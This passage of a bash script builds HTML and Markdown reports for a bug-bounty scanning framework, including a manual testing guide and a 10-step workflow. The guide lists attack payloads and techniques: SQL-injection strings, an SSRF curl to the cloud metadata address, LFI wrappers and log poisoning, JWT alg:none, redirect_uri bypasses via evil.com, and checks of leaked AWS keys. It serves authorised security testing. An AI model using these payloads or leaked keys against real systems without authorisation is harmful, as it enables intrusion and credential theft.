.ft{text-align:center;padding:26px;color:var(--t3);font-family:var(--mono);font-size:.73em;
    border-top:1px solid var(--bd);margin-top:30px}
</style>
</head>
<body>
<div class="hdr">
  <div class="logo">Bug Framework</div>
  <div class="hsub">v${VERSION} · OWASP TOP 10 · IDOR · BAC · OAuth · XSS · SQLi · SSRF · LFI · CSRF</div>
  <div class="htgt">🎯 &nbsp;${DOMAIN}</div>
  <div class="hmeta">
    <span>🗓 ${DT}</span><span>⏱ ${DUR_M}m ${DUR_S}s</span>
    <span>⚡ $(if [[ "$F_DEEP" == true ]]; then echo DEEP; elif [[ "$F_QUICK" == true ]]; then echo QUICK; else echo FULL; fi)</span>
    <span>🔐 $(if [[ -n "$SESSION_COOKIE" ]]; then echo Authenticated; else echo Unauthenticated; fi)</span>
  </div>
</div>

<div class="wrap">

<div class="sg">
  <div class="sc cb"><div class="sn nc">${n_sub}</div><div class="sl">Subdomains</div></div>
  <div class="sc cg"><div class="sn ng">${n_live}</div><div class="sl">Live Hosts</div></div>
  <div class="sc cb"><div class="sn nc">${n_urls}</div><div class="sl">URLs</div></div>
  <div class="sc cy"><div class="sn ny">${n_js}</div><div class="sl">JS Files</div></div>
  <div class="sc cb"><div class="sn nc">${n_ep}</div><div class="sl">Endpoints</div></div>
  <div class="sc cb"><div class="sn nc">${n_params}</div><div class="sl">Params</div></div>
  <div class="sc cr $([ "${n_crit}" -gt 0 ] && echo alert)"><div class="sn nr">${n_crit}</div><div class="sl">Critical</div></div>
  <div class="sc co $([ "${n_high}" -gt 0 ] && echo alert)"><div class="sn no">${n_high}</div><div class="sl">High</div></div>
  <div class="sc cr $([ "${n_xss}" -gt 0 ] && echo alert)"><div class="sn nr">${n_xss}</div><div class="sl">XSS</div></div>
  <div class="sc cr $([ "${n_lfi}" -gt 0 ] && echo alert)"><div class="sn nr">${n_lfi}</div><div class="sl">LFI</div></div>
  <div class="sc co $([ "${n_ssrf}" -gt 0 ] && echo alert)"><div class="sn no">${n_ssrf}</div><div class="sl">SSRF</div></div>
  <div class="sc cy"><div class="sn ny">${n_csrf}</div><div class="sl">CSRF</div></div>
  <div class="sc cr $([ "${n_sec}" -gt 0 ] && echo alert)"><div class="sn nr">${n_sec}</div><div class="sl">Secrets</div></div>
  <div class="sc co"><div class="sn no">${n_bypass}</div><div class="sl">403 Bypass</div></div>
  <div class="sc cy $([ "${n_bac}" -gt 0 ] && echo alert)"><div class="sn ny">${n_bac}</div><div class="sl">BAC Unauthed</div></div>
  <div class="sc cr"><div class="sn nr">${n_idor_p}</div><div class="sl">IDOR Priority</div></div>
  <div class="sc cy"><div class="sn ny">${n_bac_p}</div><div class="sl">BAC Priority</div></div>
  <div class="sc cb"><div class="sn nc">${n_oauth}</div><div class="sl">OAuth</div></div>
  <div class="sc cp"><div class="sn np">${n_cors}</div><div class="sl">CORS</div></div>
  <div class="sc cr $([ "${n_take}" -gt 0 ] && echo alert)"><div class="sn nr">${n_take}</div><div class="sl">Takeovers</div></div>
  <div class="sc cr $([ "${n_expose}" -gt 0 ] && echo alert)"><div class="sn nr">${n_expose}</div><div class="sl">Exposed Files</div></div>
</div>

<!-- OWASP Coverage -->
<div class="sec">
  <div class="sh" onclick="t(this)"><div class="snum p">★</div><div class="stit">OWASP TOP 10 — COVERAGE</div></div>
  <div class="sb">
    <div class="owr">
      <div class="owb $([ $(( n_bac + n_bac_p )) -gt 0 ] && echo hit || echo ok)">A01 Broken Access Control [BAC:${n_bac} IDOR:${n_idor_p}]</div>
      <div class="owb $([ "${n_sec}" -gt 0 ] && echo hit || echo part)">A02 Cryptographic Failures [secrets:${n_sec}]</div>
      <div class="owb $([ $(( n_xss + n_lfi )) -gt 0 ] && echo hit || echo part)">A03 Injection [XSS:${n_xss} LFI:${n_lfi}]</div>
      <div class="owb part">A04 Insecure Design</div>
      <div class="owb $([ "${n_bypass}" -gt 0 ] && echo hit || echo part)">A05 Security Misconfig [bypass:${n_bypass} exposed:${n_expose}]</div>
      <div class="owb $([ "${n_sec}" -gt 0 ] && echo hit || echo part)">A06 Vulnerable Components</div>
      <div class="owb $([ "${n_oauth}" -gt 0 ] && echo part || echo ok)">A07 Auth Failures [oauth:${n_oauth}]</div>
      <div class="owb part">A08 Software &amp; Data Integrity</div>
      <div class="owb part">A09 Logging &amp; Monitoring</div>
      <div class="owb $([ "${n_ssrf}" -gt 0 ] && echo hit || echo part)">A10 SSRF [${n_ssrf} hits]</div>
    </div>
  </div>
</div>

<!-- Critical Findings -->
<div class="sec">
  <div class="sh" onclick="t(this)">
    <div class="snum r">!</div>
    <div class="stit">CRITICAL &amp; HIGH FINDINGS</div>
    <div class="scnt red">$(( n_crit + n_high + n_xss + n_lfi + n_ssrf + n_sec + n_bac ))</div>
  </div>
  <div class="sb">
$(if [[ -s "$WORKSPACE/vulns/nuclei/nuclei_critical_high.txt" ]]; then
    while IFS= read -r line; do
        local sv; sv=$(echo "$line" | grep -oiP '^\[(CRITICAL|HIGH)\]' | tr -d '[]' | tr '[:upper:]' '[:lower:]' || true)
        [[ -z "$sv" ]] && sv="high"
        local vc; [[ "$sv" == "critical" ]] && vc="cr bc" || vc="hi bh"
        echo "    <div class=\"vi ${vc%% *}\"><span class=\"bge ${vc##* }\">${sv^^}</span>$(echo "$line" | sed 's/&/\&amp;/g;s/</\&lt;/g;s/>/\&gt;/g')</div>"
    done < "$WORKSPACE/vulns/nuclei/nuclei_critical_high.txt"
fi)
$(for src_cfg in \
    "$WORKSPACE/vulns/xss/dalfox_results.txt:XSS:hi:bh" \
    "$WORKSPACE/vulns/lfi/lfi_confirmed.txt:LFI:cr:bc" \
    "$WORKSPACE/vulns/ssrf/ssrf_hits.txt:SSRF:cr:bc" \
    "$WORKSPACE/js/secrets_found.txt:SECRET:cr:bc" \
    "$WORKSPACE/vulns/csrf/cors_misconfig.txt:CORS:hi:bh" \
    "$WORKSPACE/vulns/idor/bac_findings.txt:BAC:cr:bc" \
    "$WORKSPACE/paths/403_bypass.txt:BYPASS:hi:bh" \
    "$WORKSPACE/vulns/misconfig/sensitive_files.txt:EXPOSED:hi:bh"; do
    IFS=: read -r f label vc bg <<< "$src_cfg"
    [[ -s "$f" ]] || continue
    echo "    <hr class=\"sep\"><p class=\"pl pi-b\">${label}</p>"
    head -20 "$f" | while IFS= read -r line; do
        echo "    <div class=\"vi $vc\"><span class=\"bge $bg\">${label}</span>$(echo "$line" | sed 's/&/\&amp;/g;s/</\&lt;/g;s/>/\&gt;/g')</div>"
    done
done)
    $([[ ! -s "$WORKSPACE/vulns/nuclei/nuclei_critical_high.txt" ]] && echo '<div class="inf">No critical/high nuclei findings — check nuclei_full.txt for all results.</div>')
  </div>
</div>

<!-- IDOR -->
<div class="sec">
  <div class="sh" onclick="t(this)">
    <div class="snum r">ID</div>
    <div class="stit">IDOR — PRIORITY TARGETS</div>
    <div class="scnt">${n_idor_p} priority / $(cnt "$WORKSPACE/classified/idor/IDOR_ALL.txt") total</div>
  </div>
  <div class="sb col">
    <span class="pl pi-i">Numeric IDs: $(cnt "$WORKSPACE/classified/idor/idor_numeric_id.txt")</span>
    <span class="pl pi-i">UUIDs: $(cnt "$WORKSPACE/classified/idor/idor_uuid.txt")</span>
    <span class="pl pi-i">API Objects: $(cnt "$WORKSPACE/classified/idor/idor_api_object.txt")</span>
    <span class="pl pi-i">Download/View: $(cnt "$WORKSPACE/classified/idor/idor_download_view.txt")</span>
    <span class="pl pi-i">Ownership Params: $(cnt "$WORKSPACE/classified/idor/idor_ownership_params.txt")</span>
    <div style="margin-top:12px">
$(head -60 "$WORKSPACE/classified/idor/IDOR_PRIORITY.txt" 2>/dev/null | while IFS= read -r l; do
    echo "      <div class=\"vi hi\"><span class=\"bge bh\">IDOR</span>$(echo "$l" | sed 's/&/\&amp;/g;s/</\&lt;/g;s/>/\&gt;/g')</div>"
done)
    </div>
    <div class="inf" style="margin-top:11px">Full → <code style="color:var(--gr);font-family:var(--mono)">${WORKSPACE}/classified/idor/IDOR_PRIORITY.txt</code></div>
  </div>
</div>

<!-- BAC -->
<div class="sec">
  <div class="sh" onclick="t(this)">
    <div class="snum y">AC</div>
    <div class="stit">BAC — BROKEN ACCESS CONTROL</div>
    <div class="scnt">${n_bac_p} priority / $(cnt "$WORKSPACE/classified/bac/BAC_ALL.txt") total</div>
  </div>
  <div class="sb col">
    <span class="pl pi-b">Admin Paths: $(cnt "$WORKSPACE/classified/bac/bac_admin_paths.txt")</span>
    <span class="pl pi-b">User Mgmt: $(cnt "$WORKSPACE/classified/bac/bac_user_management.txt")</span>
    <span class="pl pi-b">API List-All: $(cnt "$WORKSPACE/classified/bac/bac_api_list_all.txt")</span>
    <span class="pl pi-b">Role/Perms: $(cnt "$WORKSPACE/classified/bac/bac_role_permission.txt")</span>
$(if [[ -s "$WORKSPACE/classified/bac/bac_confirmed_unauthed.txt" ]]; then
    echo "    <div class=\"alr\">⚠ $(cnt "$WORKSPACE/classified/bac/bac_confirmed_unauthed.txt") privileged endpoints returned HTTP 200 unauthenticated!</div>"
fi)
    <div style="margin-top:12px">
$(head -60 "$WORKSPACE/classified/bac/BAC_PRIORITY.txt" 2>/dev/null | while IFS= read -r l; do
    echo "      <div class=\"vi me\"><span class=\"bge bm\">BAC</span>$(echo "$l" | sed 's/&/\&amp;/g;s/</\&lt;/g;s/>/\&gt;/g')</div>"
done)
    </div>
    <div class="inf" style="margin-top:11px">Full → <code style="color:var(--gr);font-family:var(--mono)">${WORKSPACE}/classified/bac/BAC_PRIORITY.txt</code></div>
  </div>
</div>

<!-- OAuth -->
<div class="sec">
  <div class="sh" onclick="t(this)">
    <div class="snum">OA</div>
    <div class="stit">OAUTH &amp; AUTH ANALYSIS</div>
    <div class="scnt">${n_oauth} targets</div>
  </div>
  <div class="sb col">
$(if [[ -s "$WORKSPACE/classified/oauth/oauth_token_in_url.txt" ]]; then
    echo "    <div class=\"alr\">🚨 CRITICAL: $(cnt "$WORKSPACE/classified/oauth/oauth_token_in_url.txt") tokens exposed in URLs!</div>"
fi)
$(if [[ -s "$WORKSPACE/classified/oauth/oauth_no_state.txt" ]]; then
    echo "    <div class=\"wrn\">⚠ OAuth without state param (CSRF risk): $(cnt "$WORKSPACE/classified/oauth/oauth_no_state.txt")</div>"
fi)
$(if [[ -s "$WORKSPACE/classified/oauth/oauth_no_pkce.txt" ]]; then
    echo "    <div class=\"wrn\">⚠ OAuth without PKCE: $(cnt "$WORKSPACE/classified/oauth/oauth_no_pkce.txt")</div>"
fi)
$(if [[ -s "$WORKSPACE/classified/oauth/redirect_uri_open.txt" ]]; then
    echo "    <div class=\"alr\">🚨 Open redirect_uri found: $(cnt "$WORKSPACE/classified/oauth/redirect_uri_open.txt")</div>"
fi)
    <div style="margin-top:12px">
$(head -40 "$WORKSPACE/classified/oauth/OAUTH_PRIORITY.txt" 2>/dev/null | while IFS= read -r l; do
    echo "      <div class=\"vi lo\"><span class=\"bge bl\">OAUTH</span>$(echo "$l" | sed 's/&/\&amp;/g;s/</\&lt;/g;s/>/\&gt;/g')</div>"
done)
    </div>
    <div class="inf" style="margin-top:11px">Full → <code style="color:var(--gr);font-family:var(--mono)">${WORKSPACE}/classified/oauth/OAUTH_ALL.txt</code></div>
  </div>
</div>

<!-- Interesting Paths -->
<div class="sec">
  <div class="sh" onclick="t(this)">
    <div class="snum">🔍</div>
    <div class="stit">INTERESTING PATHS &amp; ENDPOINTS</div>
    <div class="scnt">$(cnt "$WORKSPACE/endpoints/interesting_paths.txt")</div>
  </div>
  <div class="sb col">
    <div class="pg">
$(head -100 "$WORKSPACE/endpoints/interesting_paths.txt" 2>/dev/null | while IFS= read -r l; do
    echo "      <div class=\"pi\">$(echo "$l" | sed 's/&/\&amp;/g;s/</\&lt;/g;s/>/\&gt;/g')</div>"
done)
    </div>
    <div class="inf" style="margin-top:11px">Full → <code style="color:var(--gr);font-family:var(--mono)">${WORKSPACE}/endpoints/interesting_paths.txt</code></div>
  </div>
</div>

<!-- Manual Testing Guide -->
<div class="sec">
  <div class="sh" onclick="t(this)">
    <div class="snum g">▶</div>
    <div class="stit">MANUAL TESTING GUIDE</div>
  </div>
  <div class="sb col">
    <table class="tbl">
      <thead><tr><th>VULNERABILITY</th><th>WHERE TO TEST</th><th>HOW TO TEST</th><th>TOOLS</th></tr></thead>
      <tbody>
        <tr><td class="tt">IDOR</td>
          <td class="tw">classified/idor/IDOR_PRIORITY.txt<br>Numeric IDs, UUIDs in API paths</td>
          <td>Create 2 accounts. Swap user A ID for user B across every API call. Test /api/users/1 → /api/users/2. Try UUIDs, base64, negative values, 0, large numbers. Check if response leaks cross-account data. Use Autorize extension to automate.</td>
          <td><div class="ttg"><span class="tag">Burp Suite</span><span class="tag">Autorize</span><span class="tag">Auth Analyzer</span></div></td></tr>
        <tr><td class="tt">BAC (A01)</td>
          <td class="tw">classified/bac/BAC_PRIORITY.txt<br>bac_admin_paths.txt</td>
          <td>Low-priv user → access all admin endpoints. HTTP method switching (GET→DELETE). Role param: ?role=admin, is_admin=true. Check horizontal and vertical escalation. Load BAC_PRIORITY.txt in Burp with low-priv cookie via Match &amp; Replace.</td>
          <td><div class="ttg"><span class="tag">Burp Suite</span><span class="tag">Auth Analyzer</span></div></td></tr>
        <tr><td class="tt">OAuth / Auth</td>
          <td class="tw">classified/oauth/OAUTH_PRIORITY.txt</td>
          <td>redirect_uri bypass (evil.com, //evil.com). Missing state → CSRF. No PKCE → code intercept. JWT alg:none / weak HS256 secret. Password reset link reuse. Token in URL fragment. Scope escalation. PKCE downgrade.</td>
          <td><div class="ttg"><span class="tag">Burp Suite</span><span class="tag">jwt_tool</span><span class="tag">Manual</span></div></td></tr>
        <tr><td class="tt">XSS (A03)</td>
          <td class="tw">urls/gf/xss.txt<br>js/dom_xss_sinks.txt</td>
          <td>Validate dalfox results in browser. Stored XSS in profile/comments/usernames. DOM sinks: innerHTML, document.write. postMessage XSS. SVG/img onerror. CSP bypass. Hosts without CSP (see no_csp.txt).</td>
          <td><div class="ttg"><span class="tag">dalfox</span><span class="tag">XSStrike</span><span class="tag">Burp</span></div></td></tr>
        <tr><td class="tt">SQLi (A03)</td>
          <td class="tw">urls/gf/sqli.txt<br>vulns/sqli/</td>
          <td>Review sqlmap output dirs. Manual: ' AND 1=1--, SLEEP(5), error-based. Second-order SQLi in stored values. NoSQLi on MongoDB: [$ne]=, [$regex]=. Time-based blind.</td>
          <td><div class="ttg"><span class="tag">sqlmap</span><span class="tag">Burp</span></div></td></tr>
        <tr><td class="tt">SSRF (A10)</td>
          <td class="tw">urls/gf/ssrf.txt<br>vulns/ssrf/ssrf_hits.txt</td>
          <td>Use Burp Collaborator. Try 169.254.169.254 (AWS), metadata.google.internal (GCP). Hex IP (0x7f000001), decimal (2130706433), IPv6 (::1). DNS rebinding. Blind via OOB DNS (interactsh).</td>
          <td><div class="ttg"><span class="tag">Burp Collab</span><span class="tag">interactsh</span></div></td></tr>
        <tr><td class="tt">LFI (A03)</td>
          <td class="tw">urls/gf/lfi.txt<br>vulns/lfi/</td>
          <td>php://filter/convert.base64-encode. Log poisoning (inject PHP in User-Agent → LFI to log). /proc/self/environ. Null byte %00. Double encoding. Phar://, zip:// wrappers.</td>
          <td><div class="ttg"><span class="tag">Burp</span><span class="tag">ffuf</span></div></td></tr>
        <tr><td class="tt">CSRF</td>
          <td class="tw">vulns/csrf/csrf_findings.txt<br>vulns/csrf/cors_misconfig.txt</td>
          <td>Open PoC HTML files while logged in. SameSite=None check. CORS with credentialed request from evil.com. Content-Type change bypass. Subdomain-based CSRF bypass. Referer validation bypass.</td>
          <td><div class="ttg"><span class="tag">Burp</span><span class="tag">PoC files</span></div></td></tr>
        <tr><td class="tt">403 Bypass</td>
          <td class="tw">paths/403_bypass.txt</td>
          <td>Check 403_bypass.txt for confirmed bypasses. Manual extras: X-Original-URL, /./admin, //admin, %2f, double encoding, HTTP method switch, X-Forwarded-For: 127.0.0.1.</td>
          <td><div class="ttg"><span class="tag">curl</span><span class="tag">Burp</span><span class="tag">byp4xx</span></div></td></tr>
        <tr><td class="tt">Secrets / JS</td>
          <td class="tw">js/secrets_found.txt<br>js/aws_keys.txt</td>
          <td>Test AWS: aws sts get-caller-identity. GCP: metadata API. Stripe: /v1/charges. Verify each key against its API. Check for hardcoded creds in login flows. Look in localStorage in browser dev tools.</td>
          <td><div class="ttg"><span class="tag">Manual</span><span class="tag">aws-cli</span><span class="tag">gcloud</span></div></td></tr>
        <tr><td class="tt">Mass Assignment</td>
          <td class="tw">vulns/idor/mass_assignment_params.txt<br>API create/update endpoints</td>
          <td>Add role=admin, is_admin=true, balance=9999 to POST/PUT requests. Check if API accepts and applies them. Test during account creation, profile update, order placement. Use Param Miner for hidden fields.</td>
          <td><div class="ttg"><span class="tag">Burp</span><span class="tag">Param Miner</span></div></td></tr>
        <tr><td class="tt">GraphQL</td>
          <td class="tw">/graphql /api/graphql /gql</td>
          <td>Enable introspection (__schema). Dump schema with InQL. Test IDOR via nested queries. Batch attack. Query depth bypass. Field-level authorization. Alias-based rate limit bypass. Mutation IDOR.</td>
          <td><div class="ttg"><span class="tag">InQL</span><span class="tag">GraphQL Voyager</span></div></td></tr>
      </tbody>
    </table>
  </div>
</div>

<!-- Step-by-step guide -->
<div class="sec">
  <div class="sh" onclick="t(this)">
    <div class="snum o">10</div>
    <div class="stit">10-STEP BUG BOUNTY WORKFLOW</div>
  </div>
  <div class="sb col">
    <div class="gs"><h3>STEP 1 — TRIAGE CRITICAL/HIGH NUCLEI</h3>
      <p>Highest accuracy, start here first.</p>
      <code>cat ${WORKSPACE}/vulns/nuclei/nuclei_critical_high.txt
cat ${WORKSPACE}/vulns/nuclei/nuclei_cves.txt
cat ${WORKSPACE}/vulns/nuclei/nuclei_takeover.txt</code></div>
    <div class="gs"><h3>STEP 2 — VERIFY SECRETS IN JS</h3>
      <p>Any valid key = instant critical/high report. Test each against its API.</p>
      <code>cat ${WORKSPACE}/js/secrets_found.txt
cat ${WORKSPACE}/js/aws_keys.txt
# AWS: aws sts get-caller-identity --access-key AKIA... --secret-key ...</code></div>
    <div class="gs"><h3>STEP 3 — IDOR WITH AUTORIZE IN BURP</h3>
      <p>Install Autorize extension. Load IDOR_PRIORITY.txt as scope. Replay with low-priv session.</p>
      <code>cat ${WORKSPACE}/classified/idor/IDOR_PRIORITY.txt
# Burp → Autorize → add low-priv cookie → reload IDOR_PRIORITY.txt URLs</code></div>
    <div class="gs"><h3>STEP 4 — BAC: TEST PRIVILEGED ENDPOINTS</h3>
      <p>Check unauthed results first, then test with low-priv auth.</p>
      <code>cat ${WORKSPACE}/classified/bac/bac_confirmed_unauthed.txt
cat ${WORKSPACE}/classified/bac/BAC_PRIORITY.txt
# Burp → Match &amp; Replace → add low-priv cookie → load BAC_PRIORITY.txt</code></div>
    <div class="gs"><h3>STEP 5 — OAUTH: redirect_uri + STATE + PKCE</h3>
      <p>OAuth bugs are high-impact and scanner-resistant — always manual test.</p>
      <code>cat ${WORKSPACE}/classified/oauth/OAUTH_PRIORITY.txt
cat ${WORKSPACE}/classified/oauth/oauth_token_in_url.txt
cat ${WORKSPACE}/classified/oauth/oauth_no_state.txt
# jwt_tool: python3 ~/tools/jwt_tool/jwt_tool.py TOKEN -C -d wordlist.txt</code></div>
    <div class="gs"><h3>STEP 6 — SSRF WITH BURP COLLABORATOR</h3>
      <p>Get collaborator payload. Replace URL params. Test cloud metadata directly.</p>
      <code>cat ${WORKSPACE}/urls/gf/ssrf.txt
# Manual: curl 'https://$DOMAIN/api?url=http://169.254.169.254/latest/meta-data/'</code></div>
    <div class="gs"><h3>STEP 7 — XSS: VALIDATE + BUILD PoC</h3>
      <p>dalfox can have false positives. Load each in browser to confirm.</p>
      <code>cat ${WORKSPACE}/vulns/xss/dalfox_results.txt
cat ${WORKSPACE}/js/dom_xss_sinks.txt
cat ${WORKSPACE}/vulns/xss/no_csp.txt  # hosts without CSP = easier targets</code></div>
    <div class="gs"><h3>STEP 8 — CSRF + CORS PoC</h3>
      <p>Open each PoC while logged in. Check CORS for credentialed theft.</p>
      <code>ls ${WORKSPACE}/vulns/csrf/csrf_poc_*.html
cat ${WORKSPACE}/vulns/csrf/cors_misconfig.txt</code></div>
    <div class="gs"><h3>STEP 9 — IMPORT TO BURP + PARAM MINER</h3>
      <p>Load URL lists into Burp. Use params list with Param Miner.</p>
      <code>ls ${WORKSPACE}/classified/burp_imports/
cat ${WORKSPACE}/params/all_params.txt  # → Param Miner wordlist</code></div>
    <div class="gs"><h3>STEP 10 — DOCUMENT EACH FINDING</h3>
      <p>URL · Param · Payload · Impact (CVSS) · Repro Steps · Screenshot · Fix.</p>
      <code># HTML: ${RPT}/report.html
# MD:   ${RPT}/report.md</code></div>
  </div>
</div>

<!-- Data Files -->
<div class="sec">
  <div class="sh" onclick="t(this)"><div class="snum">📁</div><div class="stit">ALL DATA FILES — WORKSPACE INDEX</div></div>
  <div class="sb col">
    <ul class="fl">
      <li><span>Subdomains (all)</span><span class="fc"><a href="file://${WORKSPACE}/subdomains/all_subdomains.txt">${n_sub}</a></span></li>
      <li><span>Live URLs</span><span class="fc"><a href="file://${WORKSPACE}/subdomains/live_urls.txt">${n_live}</a></span></li>
      <li><span>Status 200</span><span class="fc"><a href="file://${WORKSPACE}/subdomains/status_200.txt">$(cnt "$WORKSPACE/subdomains/status_200.txt")</a></span></li>
      <li><span>Status 403</span><span class="fc"><a href="file://${WORKSPACE}/subdomains/status_403.txt">$(cnt "$WORKSPACE/subdomains/status_403.txt")</a></span></li>
      <li><span>Tech Stack</span><span class="fc"><a href="file://${WORKSPACE}/subdomains/tech_stack.txt">→</a></span></li>
      <li><span>Takeover Candidates</span><span class="fc r"><a href="file://${WORKSPACE}/subdomains/takeover_candidates.txt">$(cnt "$WORKSPACE/subdomains/takeover_candidates.txt")</a></span></li>
      <li><span>Nmap Port Scan</span><span class="fc"><a href="file://${WORKSPACE}/subdomains/nmap_scan.txt">→</a></span></li>
      <li><span>All URLs</span><span class="fc"><a href="file://${WORKSPACE}/urls/all_urls.txt">${n_urls}</a></span></li>
      <li><span>URLs with Params</span><span class="fc"><a href="file://${WORKSPACE}/urls/urls_with_params.txt">$(cnt "$WORKSPACE/urls/urls_with_params.txt")</a></span></li>
      <li><span>GF XSS</span><span class="fc"><a href="file://${WORKSPACE}/urls/gf/xss.txt">$(cnt "$WORKSPACE/urls/gf/xss.txt")</a></span></li>
      <li><span>GF SQLi</span><span class="fc"><a href="file://${WORKSPACE}/urls/gf/sqli.txt">$(cnt "$WORKSPACE/urls/gf/sqli.txt")</a></span></li>
      <li><span>GF SSRF</span><span class="fc"><a href="file://${WORKSPACE}/urls/gf/ssrf.txt">$(cnt "$WORKSPACE/urls/gf/ssrf.txt")</a></span></li>
      <li><span>GF LFI</span><span class="fc"><a href="file://${WORKSPACE}/urls/gf/lfi.txt">$(cnt "$WORKSPACE/urls/gf/lfi.txt")</a></span></li>
      <li><span>GF Redirect</span><span class="fc"><a href="file://${WORKSPACE}/urls/gf/redirect.txt">$(cnt "$WORKSPACE/urls/gf/redirect.txt")</a></span></li>
      <li><span>JS Files</span><span class="fc"><a href="file://${WORKSPACE}/js/js_urls.txt">${n_js}</a></span></li>
      <li><span>JS Endpoints</span><span class="fc"><a href="file://${WORKSPACE}/js/all_js_endpoints.txt">$(cnt "$WORKSPACE/js/all_js_endpoints.txt")</a></span></li>
      <li><span>Secrets in JS</span><span class="fc r"><a href="file://${WORKSPACE}/js/secrets_found.txt">${n_sec}</a></span></li>
      <li><span>AWS Keys</span><span class="fc r"><a href="file://${WORKSPACE}/js/aws_keys.txt">$(cnt "$WORKSPACE/js/aws_keys.txt")</a></span></li>
      <li><span>GCP Keys</span><span class="fc r"><a href="file://${WORKSPACE}/js/gcp_keys.txt">$(cnt "$WORKSPACE/js/gcp_keys.txt")</a></span></li>
      <li><span>JWT Tokens</span><span class="fc"><a href="file://${WORKSPACE}/js/jwt_tokens.txt">$(cnt "$WORKSPACE/js/jwt_tokens.txt")</a></span></li>
      <li><span>DOM XSS Sinks</span><span class="fc"><a href="file://${WORKSPACE}/js/dom_xss_sinks.txt">$(cnt "$WORKSPACE/js/dom_xss_sinks.txt")</a></span></li>
      <li><span>All Endpoints</span><span class="fc"><a href="file://${WORKSPACE}/endpoints/all_endpoints.txt">${n_ep}</a></span></li>
      <li><span>Interesting Paths</span><span class="fc"><a href="file://${WORKSPACE}/endpoints/interesting_paths.txt">$(cnt "$WORKSPACE/endpoints/interesting_paths.txt")</a></span></li>
      <li><span>All Parameters</span><span class="fc"><a href="file://${WORKSPACE}/params/all_params.txt">${n_params}</a></span></li>
      <li><span>403 Bypasses</span><span class="fc r"><a href="file://${WORKSPACE}/paths/403_bypass.txt">${n_bypass}</a></span></li>
      <li><span>Sensitive Files</span><span class="fc r"><a href="file://${WORKSPACE}/vulns/misconfig/sensitive_files.txt">${n_expose}</a></span></li>
      <li><span>Nuclei Full</span><span class="fc"><a href="file://${WORKSPACE}/vulns/nuclei/nuclei_full.txt">${n_nuc}</a></span></li>
      <li><span>Nuclei Critical/High</span><span class="fc r"><a href="file://${WORKSPACE}/vulns/nuclei/nuclei_critical_high.txt">$((n_crit+n_high))</a></span></li>
      <li><span>Nuclei CVEs</span><span class="fc"><a href="file://${WORKSPACE}/vulns/nuclei/nuclei_cves.txt">$(cnt "$WORKSPACE/vulns/nuclei/nuclei_cves.txt")</a></span></li>
      <li><span>XSS Results</span><span class="fc r"><a href="file://${WORKSPACE}/vulns/xss/dalfox_results.txt">${n_xss}</a></span></li>
      <li><span>LFI Confirmed</span><span class="fc r"><a href="file://${WORKSPACE}/vulns/lfi/lfi_confirmed.txt">${n_lfi}</a></span></li>
      <li><span>SSRF Hits</span><span class="fc r"><a href="file://${WORKSPACE}/vulns/ssrf/ssrf_hits.txt">${n_ssrf}</a></span></li>
      <li><span>CSRF Findings</span><span class="fc"><a href="file://${WORKSPACE}/vulns/csrf/csrf_findings.txt">${n_csrf}</a></span></li>
      <li><span>CORS Misconfig</span><span class="fc r"><a href="file://${WORKSPACE}/vulns/csrf/cors_misconfig.txt">${n_cors}</a></span></li>
      <li><span>BAC Unauthed</span><span class="fc r"><a href="file://${WORKSPACE}/vulns/idor/bac_findings.txt">${n_bac}</a></span></li>
      <li><span>IDOR Priority</span><span class="fc"><a href="file://${WORKSPACE}/classified/idor/IDOR_PRIORITY.txt">${n_idor_p}</a></span></li>
      <li><span>BAC Priority</span><span class="fc"><a href="file://${WORKSPACE}/classified/bac/BAC_PRIORITY.txt">${n_bac_p}</a></span></li>
      <li><span>OAuth All</span><span class="fc"><a href="file://${WORKSPACE}/classified/oauth/OAUTH_ALL.txt">${n_oauth}</a></span></li>
      <li><span>Burp Imports</span><span class="fc"><a href="file://${WORKSPACE}/classified/burp_imports/">→</a></span></li>
      <li><span>Scan Config</span><span class="fc"><a href="file://${WORKSPACE}/scan_config.txt">→</a></span></li>
      <li><span>Master Log</span><span class="fc"><a href="file://${LOG_MASTER}">→</a></span></li>
    </ul>
  </div>
</div>

</div><!-- /wrap -->
<div class="ft">BUG FRAMEWORK v${VERSION} · ${DOMAIN} · ${DT} · ${DUR_M}m ${DUR_S}s · ⚡ AUTHORIZED TARGETS ONLY ⚡</div>

<script>
function t(h){h.nextElementSibling.classList.toggle('col')}
document.addEventListener('DOMContentLoaded',()=>{
  const critical=document.querySelectorAll('.sec')[1];
  if(critical)critical.querySelector('.sb').classList.remove('col');
});
</script>
</body></html>
HTMLEOF

    log_ok "HTML report → $RPT/report.html"

    # ── Markdown Report ───────────────────────────────
    cat > "$RPT/report.md" << MDEOF
# 🐛 BUG Framework v${VERSION} — Security Report
## Target: \`${DOMAIN}\`
**Date:** ${DT} | **Duration:** ${DUR_M}m ${DUR_S}s | **Mode:** $(if [[ "$F_DEEP" == true ]]; then echo DEEP; elif [[ "$F_QUICK" == true ]]; then echo QUICK; else echo FULL; fi)

---

## Summary

| Category | Count | Category | Count |
|---|---|---|---|
| Subdomains | ${n_sub} | Live Hosts | ${n_live} |
| URLs | ${n_urls} | JS Files | ${n_js} |
| Endpoints | ${n_ep} | Parameters | ${n_params} |
| **Critical** | **${n_crit}** | **High** | **${n_high}** |
| XSS | ${n_xss} | LFI | ${n_lfi} |
| SSRF | ${n_ssrf} | CSRF | ${n_csrf} |
| CORS Issues | ${n_cors} | Secrets in JS | ${n_sec} |
| 403 Bypasses | ${n_bypass} | BAC Unauthed | ${n_bac} |
| IDOR Priority | ${n_idor_p} | BAC Priority | ${n_bac_p} |
| OAuth Targets | ${n_oauth} | Exposed Files | ${n_expose} |
| Takeovers | ${n_take} | | |

---

## Critical Findings

### Nuclei Critical/High
\`\`\`
$(head -50 "$WORKSPACE/vulns/nuclei/nuclei_critical_high.txt" 2>/dev/null || echo "None")
\`\`\`

### XSS
\`\`\`
$(head -20 "$WORKSPACE/vulns/xss/dalfox_results.txt" 2>/dev/null || echo "None")
\`\`\`

### LFI Confirmed
\`\`\`
$(cat "$WORKSPACE/vulns/lfi/lfi_confirmed.txt" 2>/dev/null || echo "None")
\`\`\`

### SSRF Hits
\`\`\`
$(cat "$WORKSPACE/vulns/ssrf/ssrf_hits.txt" 2>/dev/null || echo "None")
\`\`\`

### Secrets in JS
\`\`\`
$(head -20 "$WORKSPACE/js/secrets_found.txt" 2>/dev/null || echo "None")
\`\`\`

### BAC Unauthenticated
\`\`\`
$(cat "$WORKSPACE/vulns/idor/bac_findings.txt" 2>/dev/null || echo "None")
\`\`\`

### CORS
\`\`\`
$(cat "$WORKSPACE/vulns/csrf/cors_misconfig.txt" 2>/dev/null || echo "None")
\`\`\`

### 403 Bypasses
\`\`\`
